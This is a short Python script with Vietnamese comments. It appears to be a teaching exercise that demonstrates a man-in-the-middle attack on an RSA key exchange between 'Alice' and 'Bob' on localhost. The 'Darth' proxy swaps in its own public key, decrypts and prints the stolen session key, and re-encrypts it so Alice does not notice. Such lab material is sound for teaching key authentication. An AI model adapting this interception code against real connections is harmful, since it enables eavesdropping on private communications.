import socket
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization, hashes

# Darth tạo cặp khóa giả của mình
pr_d = rsa.generate_private_key(65537, 2048)
pu_d_pem = pr_d.public_key().public_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PublicFormat.SubjectPublicKeyInfo
)

def start_mitm():
    # --- PHẦN 1: Đánh chặn Alice ---
    proxy_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    proxy_server.bind(('127.0.0.1', 8000)) 
    proxy_server.listen(1)
    print("[Darth] Đang đứng giữa port 8000 và 9000...")

    alice_conn, _ = proxy_server.accept()
    alice_data = alice_conn.recv(4096).decode().split('|')
    id_a = alice_data[0]
    real_pu_a_pem = alice_data[1].encode()
    print(f"[Darth] Chặn được khóa của {id_a}. Đang tráo bằng khóa của Darth...")

    # --- PHẦN 2: Kết nối tới Bob ---
    darth_client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    darth_client.connect(('127.0.0.1', 9000))
    # Gửi ID của Alice nhưng kèm Public Key của Darth
    darth_client.send(f"{id_a}|{pu_d_pem.decode()}".encode())

    # --- PHẦN 3: Đánh cắp Session Key ---
    encrypted_ks_from_bob = darth_client.recv(4096)
    
    # Darth giải mã bằng Private Key của chính mình (PRd)
    stolen_ks = pr_d.decrypt(
        encrypted_ks_from_bob,
        padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None)
    )
    print(f"[Darth] !!! ĐÃ ĐÁNH CẮP ĐƯỢC SESSION KEY: {stolen_ks.decode()}")

    # --- PHẦN 4: Chuyển tiếp cho Alice ---
    # Để Alice không nghi ngờ, Darth mã hóa lại bằng Public Key THẬT của Alice
    real_pu_a = serialization.load_pem_public_key(real_pu_a_pem)
    if isinstance(real_pu_a, rsa.RSAPublicKey):
        forward_ks = real_pu_a.encrypt(
            stolen_ks,
            padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None)
        )
    alice_conn.send(forward_ks)
    
    alice_conn.close()
    darth_client.close()

if __name__ == "__main__":
    start_mitm()